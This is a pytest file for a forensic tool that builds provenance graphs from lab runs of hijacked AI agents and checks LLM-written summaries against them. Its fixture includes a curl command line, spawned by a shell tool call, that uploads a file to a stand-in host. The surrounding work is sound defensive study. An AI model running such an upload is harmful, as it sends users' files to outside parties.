"""v0.7.1: what the agent runtime does for itself is not a tool call's effect, and denied actions
are checked against the graph's absence of them.

On the v0.7 lab summaries (Qwen2.5-7B, 13 runs) 3 of the 8 dropped sentences were about the
agent's own model-server traffic (127.0.0.1:8080) or the harness's copies of fetched pages
(<run>\\sources\\<sha256>), which the time-window join had credited to the tool call running at
the time; one ("the process did not write or read any files") was dropped for the verbs it denied.
"""
import json
import subprocess
import sys
from pathlib import Path

import pytest

from prompttracir import views
from prompttracir.case import Case
from prompttracir.graph import ProvGraph
from prompttracir.llm import neighbourhood, relation_problems
from prompttracir.pipeline import analyze, ingest
from prompttracir.schema import Edge, EdgeStatus, Node, NodeKind

ROOT = Path(__file__).resolve().parents[1]
RUNTIME = "{a0000005-1111-6a00-0000-001000000005}"     # python.exe running the harness in the sample
SOURCE_SHA = "ab" * 32                                   # the guide's source hash in the sample


def _sysmon(eid: int, rec: int, t: str, **data) -> str:
    return json.dumps({"EventID": eid, "TimeCreated": f"2026-10-29T07:00:{t}Z", "Computer": "LAB-WIN11",
                       "RecordID": rec, "Channel": "Microsoft-Windows-Sysmon/Operational",
                       "EventData": {"UtcTime": f"2026-10-29 07:00:{t[:6]}", "User": "LAB-WIN11\\lab",
                                     "ProcessGuid": RUNTIME, "ProcessId": "4100",
                                     "Image": "C:\\Python312\\python.exe", **data}})


@pytest.fixture(scope="module")
def case(tmp_path_factory):
    sample = tmp_path_factory.mktemp("sample")
    subprocess.run([sys.executable, str(ROOT / "samples" / "make_sample.py"), str(sample)], check=True)
    # inside t1's window (1.0 s to 1.6 s): the runtime asks the model server, and the harness
    # stores the fetched page under sources\<sha256>
    with open(sample / "sysmon.jsonl", "a") as f:
        f.write(_sysmon(3, 901, "01.300000", DestinationIp="127.0.0.1", DestinationPort="8080",
                        Protocol="tcp", Initiated="true") + "\n")
        f.write(_sysmon(11, 902, "01.400000", TargetFilename="C:\\lab\\runs\\r1\\sources") + "\n")
        f.write(_sysmon(11, 903, "01.410000",
                        TargetFilename=f"C:\\lab\\runs\\r1\\sources\\{SOURCE_SHA}") + "\n")
    c = Case.create(tmp_path_factory.mktemp("c") / "case", "v071", json.loads((sample / "envelope.json").read_text()))
    for f, k in [("trace.jsonl", "agent_trace"), ("requests.jsonl", "agent_requests"), ("sysmon.jsonl", "sysmon"),
                 ("ConsoleHost_history.txt", "psreadline"), ("zeek_conn.json", "zeek_conn")]:
        c.add_evidence(sample / f, k)
    ingest(c)
    analyze(c)
    return c


def test_model_traffic_and_source_copies_are_not_tool_call_effects(case):
    pg = ProvGraph.from_json(case.read_output("graph.json"))
    internal = {n.id: n.attrs["agent_internal"] for n in pg.nodes() if n.attrs.get("agent_internal")}
    assert internal == {"net:127.0.0.1:8080": "model_api",
                        "file:c:\\lab\\runs\\r1\\sources": "harness_record",
                        f"file:c:\\lab\\runs\\r1\\sources\\{SOURCE_SHA}": "harness_record"}
    for e in pg.edges():
        if e.src.startswith("tool_call:"):
            assert e.dst not in internal, e
    # the page fetch itself is still t1's
    assert any(e.src == "tool_call:t1" and e.dst.startswith("net:10.10.10.5") for e in pg.edges())
    t1 = next(s for s in views.attack_flow(case)["steps"] if s["node"]["id"] == "tool_call:t1")
    assert not any(x["id"] in internal for x in t1["effects"])


def test_summary_context_leaves_out_the_agents_own_nodes(case):
    pg = ProvGraph.from_json(case.read_output("graph.json"))
    chain = case.read_output("chain.json")
    # the runtime process is a neighbour of the chain, and its own edges still exist
    assert any(e.dst == "net:127.0.0.1:8080" and e.src.startswith("process:") for e in pg.edges())
    ids = neighbourhood(pg, set(chain["nodes"]) | {f"process:{RUNTIME.strip('{}')}"})
    assert not any(pg.node(n).attrs.get("agent_internal") for n in ids)


def _graph() -> ProvGraph:
    pg = ProvGraph()
    for nid, kind, attrs in [("tool_call:t1", NodeKind.TOOL_CALL, {"tool": "http_get"}),
                             ("tool_call:t2", NodeKind.TOOL_CALL, {"tool": "shell"}),
                             ("process:curl", NodeKind.PROCESS, {"command_line": "curl.exe -F file=@x http://c"}),
                             ("net:c", NodeKind.NETWORK, {"ip": "192.168.56.11"}),
                             ("file:notes", NodeKind.FILE, {"path": "C:\\Users\\lab\\project\\notes.md"})]:
        pg.add_node(Node(id=nid, kind=kind, label=nid, attrs=attrs))
    pg.add_edge(Edge(src="tool_call:t2", dst="process:curl", relation="spawned", status=EdgeStatus.CORROBORATED))
    pg.add_edge(Edge(src="process:curl", dst="net:c", relation="connected", status=EdgeStatus.OBSERVED))
    return pg


def test_denied_actions_are_checked_against_absence():
    pg = _graph()
    # true denials: curl wrote and read nothing
    assert relation_problems("The process did not write or read any files.", ["process:curl"], pg) == []
    assert relation_problems("curl.exe never wrote notes.md.", ["process:curl", "file:notes"], pg) == []
    # a false denial: curl did connect
    assert relation_problems("curl.exe did not connect to the server.", ["process:curl", "net:c"], pg)
    # the positive part of a mixed sentence is still checked
    assert relation_problems("t1 wrote notes.md, but did not run anything.", ["tool_call:t1", "file:notes"], pg)
    assert relation_problems("t2 ran curl.exe, which did not write any file.",
                             ["tool_call:t2", "process:curl"], pg) == []
